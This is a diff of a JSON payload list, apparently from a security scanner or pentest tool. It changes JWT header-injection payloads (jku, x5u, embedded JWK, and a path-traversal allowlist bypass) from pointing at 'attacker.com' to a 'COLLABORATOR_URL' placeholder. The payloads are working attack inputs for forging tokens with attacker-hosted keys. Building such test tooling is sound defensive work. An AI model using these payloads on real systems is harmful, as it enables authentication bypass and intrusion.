@@ -46,10 +46,10 @@
     "jwt_jku_x5u": {
       "description": "JWT header injection via jku (JWK Set URL) and x5u (X.509 URL) claims",
       "payloads": [
-        {"payload": "{\"jku\":\"https://attacker.com/.well-known/jwks.json\",\"alg\":\"RS256\"}", "description": "jku injection: host your own JWKS with matching key pair at attacker URL", "waf_bypass": false},
-        {"payload": "{\"x5u\":\"https://attacker.com/cert.pem\",\"alg\":\"RS256\"}", "description": "x5u injection: host attacker-controlled X.509 certificate chain", "waf_bypass": false},
+        {"payload": "{\"jku\":\"https://COLLABORATOR_URL/.well-known/jwks.json\",\"alg\":\"RS256\"}", "description": "jku injection: Collaborator interaction confirms server fetches the URL — full bypass requires hosting matching JWKS", "waf_bypass": false},
+        {"payload": "{\"x5u\":\"https://COLLABORATOR_URL/cert.pem\",\"alg\":\"RS256\"}", "description": "x5u injection: Collaborator interaction confirms server fetches the X.509 chain — full bypass requires hosting matching cert", "waf_bypass": false},
         {"payload": "{\"jwk\":{\"kty\":\"RSA\",\"n\":\"ATTACKER_MODULUS\",\"e\":\"AQAB\"},\"alg\":\"RS256\"}", "description": "Embedded JWK: inject attacker's public key directly in JWT header", "waf_bypass": false},
-        {"payload": "{\"jku\":\"https://target.com/.well-known/jwks.json/../../../attacker.com/jwks.json\",\"alg\":\"RS256\"}", "description": "jku with path traversal to bypass URL allowlist on target domain", "waf_bypass": true}
+        {"payload": "{\"jku\":\"https://target.com/.well-known/jwks.json/../../../COLLABORATOR_URL/jwks.json\",\"alg\":\"RS256\"}", "description": "jku with path traversal to bypass URL allowlist on target domain — Collaborator interaction confirms traversal", "waf_bypass": true}
       ]
     },
     "header_bypass": {
